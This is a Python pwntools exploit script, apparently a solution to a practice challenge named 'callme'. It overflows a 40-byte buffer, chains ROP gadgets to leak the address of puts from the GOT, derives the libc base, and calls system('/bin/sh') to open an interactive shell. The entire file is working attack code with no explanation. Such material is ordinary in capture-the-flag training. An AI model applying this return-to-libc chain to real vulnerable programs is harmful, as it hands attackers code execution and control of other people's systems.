import time

from pwn import *


EXECUTABLE = "./callme"
context.binary = elf = ELF(EXECUTABLE)
lib_callme = ELF("./libcallme.so")
libc = elf.libc


p = process(EXECUTABLE)

OFFSET = 40
if OFFSET is None:
    p.sendafter(b"> ", cyclic(128))

    time.sleep(1)
    core = Coredump("./core")
    seg_addr = int("0x" + hex(core.fault_addr)[10:], 16)
    log.success(f"Core fault address at: {hex(core.fault_addr)}")
    log.info(f"Finding offset for {hex(seg_addr)}")
    offset = cyclic_find(seg_addr)
    log.success(f"Offset found: {offset}")
    exit()


payload  = b"A" * OFFSET

puts_leak = ROP(elf)
puts_leak.puts(elf.got.puts)
puts_leak.pwnme()

log.debug("Puts leak rop:\n" + puts_leak.dump())
p.sendafter(b"> ", flat({ OFFSET: puts_leak.chain() }))

# Get address of libc
p.recvuntil(b"Thank you!\n")
puts_addr = unpack(p.recvline(keepends=False).ljust(8, b"\x00"))
libc.address = puts_addr - libc.sym.puts
log.info(f"Libc lives at: {hex(libc.address)}")

# Prepare system call
binsh = next(libc.search(b"/bin/sh"))
rop_system = ROP([elf, libc])
rop_system.system(binsh)

# Send system call
log.debug("ROP System:\n" + rop_system.dump())
p.sendafter(b"> ", flat({ OFFSET: rop_system.chain() }))
p.recvline()

# Got a shell now
p.success("Got the shell")
p.interactive()
